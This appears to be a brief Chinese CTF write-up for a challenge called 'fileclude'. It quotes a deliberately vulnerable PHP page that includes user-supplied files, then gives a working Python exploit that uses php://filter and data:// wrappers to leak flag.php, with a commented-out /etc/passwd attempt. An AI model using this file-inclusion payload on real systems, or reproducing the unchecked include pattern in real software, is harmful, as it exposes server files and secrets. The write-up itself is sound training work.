# fileclude

```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET["file1"]) && isset($_GET["file2"]))
{
    $file1 = $_GET["file1"];
    $file2 = $_GET["file2"];
    if(!empty($file1) && !empty($file2))
    {
        if(file_get_contents($file2) === "hello ctf")
        {
            include($file1);
        }
    }
    else
        die("NONONO");
}
```

感觉和之前的一样，甚至没有校验会更简单。但难点在`file_get_contents($file2) === "hello ctf"`这部分的处理。

[参考答案](https://blog.csdn.net/weixin_42789937/article/details/128060363)里面对于`php://`的分析挺好。这道题扩充了输入的知识。

```python
import requests
# 目标URL
url = "http://61.147.171.105:55818/"
# payload= {'filename': '/etc/passwd'}
payload= {
    'file1': 'php://filter/read=convert.base64-encode/resource=flag.php',
    'file2': 'data://text/plain,hello ctf'
}

response = requests.get(url, params=payload)
print(response.text)
```
